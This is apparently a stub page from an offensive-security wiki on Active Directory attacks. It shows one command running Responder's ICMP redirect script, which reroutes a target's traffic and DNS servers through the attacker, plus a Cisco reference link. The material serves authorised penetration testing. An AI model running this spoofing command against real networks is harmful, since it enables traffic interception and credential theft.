---
authors: ShutdownRepo
category: ad
---

# 🛠️ ICMP Redirect

```bash
python3 tools/Icmp-Redirect.py --interface eth0 --ip $my_ip --gateway $gateway --target $target --route $dnsserver1 --secondaryroute $dnsserver2
```

need iptable

[https://www.cisco.com/c/en/us/support/docs/ios-nx-os-software/nx-os-software/213841-understanding-icmp-redirect-messages.html](https://www.cisco.com/c/en/us/support/docs/ios-nx-os-software/nx-os-software/213841-understanding-icmp-redirect-messages.html)

Responder/tools/ICMP_Redirect.py